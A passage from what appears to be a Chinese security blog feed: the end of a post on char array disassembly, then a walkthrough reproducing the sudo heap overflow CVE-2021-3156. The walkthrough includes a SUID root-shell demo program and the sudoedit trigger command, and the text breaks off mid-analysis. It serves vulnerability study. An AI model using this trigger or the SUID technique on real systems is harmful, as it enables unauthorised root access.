class="built_in">text</span>:<span class="number">000000000040060</span>A                 mov     qword ptr [rbp<span class="number">-0F</span>0h], <span class="number">63</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400615</span>                 mov     qword ptr [rbp<span class="number">-0E8</span>h], <span class="number">64</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400620</span>                 mov     qword ptr [rbp<span class="number">-0E0</span>h], <span class="number">65</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040062B</span>                 mov     qword ptr [rbp<span class="number">-0</span>D8h], <span class="number">66</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400636</span>                 mov     qword ptr [rbp<span class="number">-0</span>D0h], <span class="number">67</span>h</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给char* e[10]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400641</span>                 lea     rdx, [rbp+var_B0]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400648</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040064</span>D                 mov     ecx, <span class="number">0</span>Ah</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400652</span>                 mov     rdi, rdx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400655</span>                 rep stosq</span><br><span class="line">    <span class="comment">//赋值同样是8字节，但不同的是只读字符串,不是直接赋ascii值</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400658</span>                 mov     qword ptr [rbp<span class="number">-0B</span>0h], offset aA ; <span class="string">"a"</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400663</span>                 mov     qword ptr [rbp<span class="number">-0</span>A8h], offset unk_400784</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040066</span>E                 mov     qword ptr [rbp<span class="number">-0</span>A0h], offset aC ; <span class="string">"c"</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400679</span>                 mov     qword ptr [rbp<span class="number">-98</span>h], offset aD ; <span class="string">"d"</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400684</span>                 mov     qword ptr [rbp<span class="number">-90</span>h], offset aE ; <span class="string">"e"</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040068F</span>                 mov     qword ptr [rbp<span class="number">-88</span>h], offset asc_40079D ; <span class="string">"f"</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040069</span>A                 mov     qword ptr [rbp<span class="number">-80</span>h], offset aG ; <span class="string">"g"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给const char f[10]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006</span>A2                 mov     rax, <span class="number">66666666666666</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006</span>AC                 mov     [rbp<span class="number">-20</span>h], rax</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006B</span>0                 mov     <span class="keyword">word</span> ptr [rbp<span class="number">-18</span>h], <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给const char* g</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006B</span>6                 mov     qword ptr [rbp<span class="number">-118</span>h], offset aGgggggg ; <span class="string">"ggggggg"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给char* const h</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006</span>C1                 mov     qword ptr [rbp<span class="number">-110</span>h], offset aHhhhhhh ; <span class="string">"hhhhhhh"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给const char* const i</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006</span>CC                 mov     qword ptr [rbp<span class="number">-108</span>h], offset aIiiiiii ; <span class="string">"iiiiiii"</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006</span>D7                 mov     eax, <span class="number">0</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006</span>DC                 mov     rsi, [rbp<span class="number">-8</span>]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006E0</span>                 <span class="keyword">xor</span>     rsi, fs:<span class="number">28</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006E9</span>                 jz      short locret_4006F0</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006</span>EB                 call    ___stack_chk_fail</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006F</span>0 ; ---------------------------------------------------------------------------</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006F</span>0</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006F</span>0 locret_4006F0:                          ; CODE XREF: main+<span class="number">1</span>A3↑j</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006F</span>0                 leave</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006F</span>1                 retn</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006F</span>1 ; &#125; <span class="comment">// starts at 400546</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004006F</span>1 main            endp</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>一个一个来说</p><ol><li><pre><code>char a[10]={&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    这个首先会把10个位置都置为0，然后直接向栈上赋值ascii值</span><br><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>char m[]={&#39;a&#39;,&quot;b&quot;,&#39;c&#39;,&#39;d&#39;};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    这个很明显是有问题的，其中赋值字符串，由于莫名奇妙的错误，导致只赋值了寄存器低位</span><br><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure>char n[]={&#39;m&#39;,&quot;nnnn&quot;,&#39;o&#39;,&#39;d&#39;,&#39;p&#39;,&quot;q&quot;};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    有问题+1,同样是赋值字符串，和上面是一样的错误</span><br><span class="line"></span><br><span class="line">4.</span><br></pre></td></tr></table></figure>char* b=&quot;bbbbbbb&quot;;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    常用的方法，直接往栈上赋值给字符串(只读数据)所在的地址</span><br><span class="line"></span><br><span class="line">    &gt;注：存放于栈的指针b可以被修改，但是指向的数据’bbbbbbb&#39;无法更改，</span><br><span class="line"></span><br><span class="line">5.</span><br></pre></td></tr></table></figure>char c[10]=&quot;ccccccc&quot;;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    看似和上一个一样，实则是往栈上赋值ascii值</span><br><span class="line"></span><br><span class="line">6.</span><br></pre></td></tr></table></figure>char* d[10]={&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    这个其实是最神奇的，每个字符都占8个字节，由于栈上是ascii值，导致寻址时出现了错误</span><br><span class="line"></span><br><span class="line">7.</span><br></pre></td></tr></table></figure>char* e[10]={&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    字符串的地址直接赋值到栈上，然后寻址即可</span><br><span class="line"></span><br><span class="line">8.</span><br></pre></td></tr></table></figure>const char f[10]={&quot;fffffff&quot;};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    直接往栈上赋ascii值,**虽然声明了是const，但栈上的值是可更改的**</span><br><span class="line"></span><br><span class="line">9.</span><br></pre></td></tr></table></figure>const char* g=&quot;ggggggg&quot;;char* const h=&quot;hhhhhhh&quot;;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    这两个看起来是无差别的，都是栈上赋值给字符串的地址</span><br><span class="line"></span><br><span class="line">10.</span><br></pre></td></tr></table></figure> const char* const i = &quot;iiiiiii&quot;;</code></pre><p> 和9类似</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我是fw&lt;/p&gt;
&lt;p&gt;char[],char*,char的区别&lt;/p&gt;
&lt;h1 id=&quot;0x01-代码编译&quot;&gt;&lt;a href=&quot;#0x01-代码编译&quot; class=&quot;headerlink&quot; title=&quot;0x01 代码编译&quot;&gt;&lt;/a&gt;0x01 代码编译&lt;/h1&gt;&lt;p&gt;&lt;c</summary>
      
    
    
    
    
    <category term="c" scheme="https://pz1o.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156复现</title>
    <link href="https://pz1o.top/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-12T16:08:03.000Z</published>
    <updated>2021-04-16T15:28:01.433Z</updated>
    
    <content type="html"><![CDATA[<p>第一次来复现</p><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>2021年01月26日，sudo发布安全通告，修复了一个类Unix操作系统中sudo命令基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），任何本地用户（普通用户和系统用户，sudoer和非sudoers）都可以利用此漏洞，而无需进行身份验证，攻击者不需要知道用户的密码。成功利用此漏洞提权获得root权限</p><h1 id="0x02-影响环境"><a href="#0x02-影响环境" class="headerlink" title="0x02 影响环境"></a>0x02 影响环境</h1><p>- sudo:sudo: 1.8.2 - 1.8.31p2</p><p>- sudo:sudo: 1.9.0 - 1.9.5p1</p><h1 id="0x03-漏洞简要"><a href="#0x03-漏洞简要" class="headerlink" title="0x03 漏洞简要"></a>0x03 漏洞简要</h1><p>CVE-2021-3156 ——<code>sudo</code>在处理单个反斜杠结尾的命令时，发生逻辑错误，存在堆溢出漏洞。当 <code>sudo</code>通过 <code>-s</code> 或 <code>-i</code>命令行选项在 <code>shell</code>模式下运行命令时，他将在命令参数中使用反斜杠转义特殊字符。但使用 <code>-s</code>或 <code>-i</code>标志运行 <code>sudoedit</code>时，实际上并未进行转义，从而导致堆溢出。</p><h1 id="0x04-基础知识"><a href="#0x04-基础知识" class="headerlink" title="0x04 基础知识"></a>0x04 基础知识</h1><p>先了解几个基本概念</p><h2 id="1-RUID、EUID、SUID、RGID、EGID、SGID"><a href="#1-RUID、EUID、SUID、RGID、EGID、SGID" class="headerlink" title="1. RUID、EUID、SUID、RGID、EGID、SGID"></a>1. RUID、EUID、SUID、RGID、EGID、SGID</h2><ul><li>RUID RGID：real UID/real GID 用于标识我是谁，也就是登录用户的UID和GID，加入系统以pz1o登录，在Linux运行的所有的命令的实际用户ID都是pz1o的UID，实际用户组ID都是pz1o的GID</li><li>EUID EGID：effective UID/effective GID <strong>在创建与访问文件的时候发挥作用</strong>，创建文件时，系统内核将<strong>根据创建文件的进程的EUID与EGID设定文件的所有者/组属性</strong>，而在访问文件时，内核亦根<strong>据访问进程的EUID与EGID决定其能否访问文件</strong>。<strong>一般情况下</strong>，<strong>有效用户ID（EUID）等于实际用户ID（RUID）。</strong></li><li>SUID SGID：saved UID <strong>SUID属性只能运用在可执行文件上，当用户执行该执行文件时，会临时拥有该执行文件所有者的权限</strong>,简单来说s是无效的，S是有效的。当s标志出现在用户组的 x 权限时称为 SGID。\</li></ul><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/1612508511569-2c61faaf-e6de-41db-b746-a7cdb5b0149f-1618586880599.png" alt="image.png"></p><h2 id="2-基本指令"><a href="#2-基本指令" class="headerlink" title="2. 基本指令"></a>2. 基本指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  whoami <span class="comment">#显示的是当前用户下的用户名</span></span><br><span class="line">pz1o</span><br><span class="line">➜  ~  who   <span class="comment">#显示当前真正登录系统中的用户</span></span><br><span class="line">pz1o     tty7         2021-03-31 20:50 (:0)</span><br><span class="line">➜  ~  su</span><br><span class="line">Password: </span><br><span class="line">root@pz1o:/home/pz1o<span class="comment"># who</span></span><br><span class="line">pz1o     tty7         2021-03-31 20:50 (:0)</span><br><span class="line">root@pz1o:/home/pz1o<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">groups</span><br><span class="line">//查看当前组的用户</span><br></pre></td></tr></table></figure><h2 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3. 权限提升"></a>3. 权限提升</h2><h3 id="su-root"><a href="#su-root" class="headerlink" title="su root"></a>su root</h3><p>登陆后<strong>没有时间限制</strong></p><h3 id="sudo-i"><a href="#sudo-i" class="headerlink" title="sudo -i"></a>sudo -i</h3><p>设置这条命令是为了频繁的执行某些只有超级用户才能执行的命令而不用每次输入密码。</p><p><strong>提权之后没有时间限制</strong></p><h3 id="sudo-su"><a href="#sudo-su" class="headerlink" title="sudo su"></a>sudo su</h3><p>sudo su表示运行sudo命令给su命令提权，运行su命令。 要求执行该命令的用户<strong>必须在sudoers中才可以完成提权。</strong>与之前的sudo -i不同的是，在完成提权之后pwd不会改变为/root。</p><h1 id="0x05-Demo"><a href="#0x05-Demo" class="headerlink" title="0x05 Demo"></a>0x05 Demo</h1><p>这里有一个关于suid引起提权的demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    system(<span class="string">"whoami"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"##################################################"</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    system(<span class="string">"whoami"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"##################################################"</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    system(<span class="string">"whoami"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"##################################################"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下</p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412152631059-1618586880599.png" alt="image-20210412152631059"></p><p>提权尚未成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;更改可执行文件的用户和组</span><br><span class="line">sudo chown root:root demo</span><br><span class="line">sudo chmod u+s demo</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412152923698-1618586880599.png" alt="image-20210412152923698"></p><p>首先这个可执行文件的其他用户权限是r-x，这意味着这个文件普通用户cyberangel也可以执行；当程序开始执行时，由于程序的拥有者的UID和GID均为root，因此在执行setuid和setgid后就可以拥有root权限</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">&gt;<span class="function"><span class="keyword">int</span> <span class="title">setuid</span><span class="params">(<span class="keyword">uid_t</span> uid)</span></span>;</span><br><span class="line">&gt;<span class="function"><span class="keyword">int</span> <span class="title">setgid</span><span class="params">(gid_ gid)</span></span>;</span><br></pre></td></tr></table></figure><p>下面我们以更改用户ID为例（关于用户ID我们所说明的一切也适用于组ID）：</p><p>①若进程具有超级用户特权，则setuid函数将实际用户ID、有效用户ID、保存的设置用户ID设置为uid</p><p>②若进程没有超级用户特权，则uid等于实际用户ID或保存的设置用户ID，则setuid只将有效用户ID设置为uid。不更改实际用户ID和保存的设置用户ID</p><p>③如果上面两个条件都不满足，则errno设置为EPERM，并返回-1</p></blockquote><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/1612582920135-dfc2a463-5fa9-43b7-8d25-176a208a72da-1618586880599.png" alt="image.png"></p><h1 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h1><p>以sudo-1.8.21p2分析</p><h2 id="1-漏洞定位"><a href="#1-漏洞定位" class="headerlink" title="1. 漏洞定位"></a>1. 漏洞定位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb --args sudoedit -s &#39;\&#39; aabbccddeeffgghhiiggkkllmmnn</span><br><span class="line">cd &#x2F;home&#x2F;cyberangel&#x2F;Desktop&#x2F;sudo-1.8.21p2&#x2F;plugins&#x2F;sudoers</span><br></pre></td></tr></table></figure><p><code>/sudo-1.8.21p2/build/plugins/sudoers/sudoers.c：852</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* set user_args */</span></span><br><span class="line"><span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">char</span> *to, *from, **av;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>, n;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">size</span> = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line"><span class="built_in">size</span> += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(<span class="built_in">size</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">    from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; *av; av++) &#123;</span><br><span class="line">    n = strlcpy(to, *av, <span class="built_in">size</span> - (to - user_args));</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="built_in">size</span> - (to - user_args)) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">"internal error, %s overflow"</span>), __func__);</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    to += n;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>直接上动调，这里主要关注sudo_mode</p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412172250144-1618586880599.png" alt="image-20210412172250144"></p><p><code>/src/sudo.c:193</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo_mode = parse_args(argc, argv, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);</span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_DEBUG, <span class="string">"sudo_mode %d"</span>, sudo_mode);</span><br></pre></td></tr></table></figure><p><code>/src/parse_args.c:528</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;<span class="comment">//检查是否开启 MODE_SHELL</span></span><br><span class="line"><span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* shell -c "command" */</span></span><br><span class="line">    <span class="keyword">char</span> *src, *dst;</span><br><span class="line">    <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line"><span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">sudo_fatalx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line"><span class="keyword">for</span> (src = *av; *src != <span class="string">'\0'</span>; src++) &#123;</span><br><span class="line">    <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">'_'</span> &amp;&amp; *src != <span class="string">'-'</span> &amp;&amp; *src != <span class="string">'$'</span>)</span><br><span class="line">*dst++ = <span class="string">'\\'</span>;<span class="comment">//添加反斜杠</span></span><br><span class="line">    *dst++ = *src;<span class="comment">//原参数</span></span><br><span class="line">&#125;</span><br><span class="line">*dst++ = <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">    *dst = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    ac += <span class="number">2</span>;<span class="comment">/* -c cmnd */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过代码第一行看出，只有当mode设置了MODE_RUN 和flags设置了 MODE_SHELL 标志后，程序才会进入到内部执行，同时在一些特殊字符前面加上反斜杠来转义。<br>而要设置标志，则可以通过在程序运行时添加参数来达到，在运行sudo程序的时候设置<code>-s</code>或<code>-i</code>参数，则在parse_args函数中将会同时MODE_RUN和MODE_SHELL标志</p><p><code>/src/parse_args.c:234</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'i'</span>:</span><br><span class="line">    sudo_settings[ARG_LOGIN_SHELL].value = <span class="string">"true"</span>;</span><br><span class="line">    SET(flags, MODE_LOGIN_SHELL);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">    sudo_settings[ARG_USER_SHELL].value = <span class="string">"true"</span>;</span><br><span class="line">    SET(flags, MODE_SHELL);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><code>/src/sudo.h</code></p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412173759464-1618586880599.png" alt="image-20210412173759464"></p><p><strong>sudo_mode是由MODE_EDIT和MODE_SHELL决定的，具有唯一性。</strong></p><p>使用 <code>sudoedit</code>。原因在于如果使用 <code>sudoedit</code>，其还是会被软链接到使用 <code>sudo</code>命令，但是在 <code>parse_args()</code>函数中会自动设置 <code>MODE_EDIT</code>和不会重置 <code>valid_flags</code>，则 <code>MODE_SHELL</code>仍然在 <code>valid_flags</code>中 ，而且不会设置 <code>MODE_RUN</code>,这样就能跳过 <code>parse_args()</code>函数中转义参数的部分，同时满足 <code>set_cmnd()</code>函数中漏洞触发的部分。</p><p>继续动调</p><p>从一开始分析，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 